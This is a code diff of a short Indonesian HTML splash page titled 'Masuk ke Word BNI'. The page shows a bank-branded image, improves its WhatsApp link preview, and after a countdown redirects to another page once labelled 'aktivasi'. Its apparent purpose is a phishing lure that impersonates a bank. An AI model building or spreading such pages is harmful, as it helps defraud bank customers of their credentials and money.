@@ -2,7 +2,8 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- ✅ PENGATURAN AGAR PAS DI LAYAR HP -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Masuk ke Word BNI</title>
     
     <!-- KODE AGAR TAMPILAN DI WHATSAPP LEBIH BAGUS -->
@@ -21,33 +22,34 @@
         body {
             width: 100vw;
             height: 100vh;
-            overflow: hidden;
+            overflow: hidden; /* Mencegah layar bisa digeser */
             display: flex;
             justify-content: center;
             align-items: center;
             background-color: #000000;
+            position: relative;
         }
 
-        /* Style Gambar */
+        /* ✅ PERBAIKAN TAMPILAN GAMBAR: PAS DAN UTUH DI LAYAR */
         #gambarPembuka {
             width: 100%;
             height: 100%;
-            object-fit: contain; 
+            object-fit: cover; /* Gambar memenuhi layar dengan pas */
+            object-position: center; /* Posisi gambar di tengah */
             position: absolute;
             top: 0;
             left: 0;
             z-index: 1;
         }
 
-        /* Style Angka Hitung Mundur */
-      
+       
         }
     </style>
 </head>
 <body>
 
     <img id="gambarPembuka" src="wordbni.jpg" alt="wordbni">
-    <div id="timer">3</div> <!-- TAMBAHAN INI BIAR ANGKA MUNCUL -->
+    <div id="timer">3</div>
 
     <script>
         let waktu = 3;
@@ -59,7 +61,7 @@
             
             if(waktu <= 0) {
                 clearInterval(hitungMundur);
-                // Pindah ke halaman aktivasi.html
+                // Pindah ke halaman tujuan
                 window.location.href = "index1.html"; 
             }
         }, 1000);
@@ -67,4 +69,3 @@
 
 </body>
 </html>
-
